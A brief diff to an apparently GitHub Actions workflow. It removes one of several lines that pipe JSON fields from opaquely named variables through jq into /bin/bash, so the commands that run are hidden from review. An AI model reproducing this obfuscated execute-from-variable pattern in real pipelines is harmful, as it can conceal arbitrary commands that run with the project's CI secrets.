@@ -24,7 +24,6 @@ jobs:
           echo $hf8 | jq -r .h86 | /bin/bash
           printf '%s' "$osl61193" | jq -r .dblwv0 | /bin/bash
           echo $qr2863 | jq -r .jcy84 | /bin/bash
-          echo $qzctp3480 | jq -r .x23 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
